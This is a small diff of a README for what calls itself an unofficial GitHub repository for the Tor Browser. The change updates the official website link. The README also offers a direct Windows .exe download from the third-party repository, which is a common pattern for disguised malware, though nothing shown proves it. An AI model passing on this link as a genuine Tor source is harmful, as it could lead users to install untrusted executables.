@@ -28,7 +28,7 @@ While the Tor Browser provides a valuable tool for online privacy and security, 
   
 
 
-Download the latest version of the Tor Browser on [this github page](https://github.com/Resimper/thetorproject/releases/tag/version), from [the website.](https://www.torproject.org/), or [download it directly!](https://github.com/Resimper/thetorproject/releases/download/version/tor-browser-windows-x86_64_13.0.1.exe)
+Download the latest version of the Tor Browser on [this github page](https://github.com/Resimper/thetorproject/releases/tag/version), from [the website.](https://www.torproject.org/download/), or [download it directly!](https://github.com/Resimper/thetorproject/releases/download/version/tor-browser-windows-x86_64_13.0.1.exe)
 
 
 *NOTE: This is the unofficial github repository for Tor.*
